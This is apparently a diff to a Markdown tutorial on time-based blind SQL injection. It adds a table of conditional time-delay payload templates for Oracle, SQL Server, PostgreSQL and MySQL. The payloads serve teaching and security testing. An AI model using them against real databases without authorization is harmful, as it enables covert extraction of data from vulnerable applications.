@@ -633,3 +633,13 @@ Then:
 and so on.
 
 That's why this is called **time-based blind SQL injection**: the database's actual result remains hidden, but its **execution time leaks information**.
+
+## ⏱️ Conditional Time Delays
+
+| Database                 | Conditional time-delay syntax                                                                                    |
+| ------------------------ | ---------------------------------------------------------------------------------------------------------------- |
+| **Oracle**               | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
+| **Microsoft SQL Server** | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                                |
+| **PostgreSQL**           | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`                                  |
+| **MySQL**                | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`                                                                   |
+
